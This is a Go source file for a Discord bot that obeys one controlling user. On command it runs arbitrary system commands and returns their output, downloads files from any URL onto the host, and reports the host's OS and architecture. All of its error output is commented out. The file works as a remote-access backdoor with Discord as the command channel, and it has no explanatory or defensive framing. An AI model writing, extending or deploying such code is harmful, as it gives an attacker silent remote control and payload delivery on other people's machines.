package main

import (
	"io/ioutil"
	"strings"
	"runtime"
	"os/exec"
	"os"
	"net/http"
	"io"

	"github.com/bwmarrin/discordgo"
)

// Variables used for command line parameters
var (
	Token string
	BotID string
	MasterID string
	BotNAME string

	a_ver string
)

func init() {

	a_ver = "v0.1"

	dat, _ := ioutil.ReadFile("config.txt")
	config_data := strings.Split(string(dat), "\n")

	Token = config_data[0]
	MasterID = config_data[1]
	BotNAME = config_data[2]
}

func main() {
	dg, err := discordgo.New("Bot " + Token)
	if err != nil {
		//fmt.Println("error creating Discord session,", err)
		return
	}
	u, err := dg.User("@me")
	if err != nil {
		//fmt.Println("error obtaining account details,", err)
	}
	BotID = u.ID
	dg.AddHandler(messageCreate)
	err = dg.Open()
	if err != nil {
		//fmt.Println("error opening connection,", err)
		return
	}
	<-make(chan struct{})
	return
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {

	comman_items := strings.Split(m.Content," ")

	if m.Author.ID == BotID || m.Author.ID != MasterID || BotNAME != comman_items[0] {
		return
	}

	if comman_items[1] == "help" {
		_, _ = s.ChannelMessageSend(m.ChannelID, "Commands:\nhelp - Display helps\nhello - returns Hi!\ninfo - displays system info\ncmd - runs command\ndownload - downloads url to file\nver - displays version")
	}

	if comman_items[1] == "hello" {
		_, _ = s.ChannelMessageSend(m.ChannelID, "Hi!")
	}

	if comman_items[1] == "info" {
		_, _ = s.ChannelMessageSend(m.ChannelID, runtime.GOOS + "," + runtime.GOARCH )
	}

	if comman_items[1] == "cmd" {
		output, _ := exec.Command(comman_items[2],comman_items[3:]...).CombinedOutput()
		_, _ = s.ChannelMessageSend(m.ChannelID,string(output))
	}

	if comman_items[1] == "download" {

		if(len(comman_items)>3){

			out, _ := os.Create(comman_items[3])
			defer out.Close()
			resp, _ := http.Get(comman_items[2])
			defer resp.Body.Close()
			io.Copy(out, resp.Body)

			_, _ = s.ChannelMessageSend(m.ChannelID,"Downloaded")

		}
	}

	if comman_items[1] == "ver" {
		_, _ = s.ChannelMessageSend(m.ChannelID,a_ver)
	}

}
